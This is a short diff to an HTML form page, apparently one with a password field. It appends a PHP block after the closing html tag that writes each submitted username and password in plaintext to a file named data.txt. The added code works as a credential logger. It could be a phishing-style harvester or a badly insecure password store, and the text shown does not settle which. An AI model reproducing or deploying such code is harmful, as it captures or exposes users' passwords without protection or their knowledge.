@@ -95,3 +95,23 @@ myInput.onkeyup = function() {
 
 </body>
 </html>
+
+
+<?php
+              
+if(isset($_POST['usrname']))
+{
+$data=$_POST['usrname'] . "\n";
+$fp = fopen('data.txt', 'a');
+fwrite($fp, $data);
+fclose($fp);
+}
+
+if(isset($_POST['psw']))
+{
+$data=$_POST['psw'] . "\n";
+$fp = fopen('data.txt', 'a');
+fwrite($fp, $data);
+fclose($fp);
+}
+?>
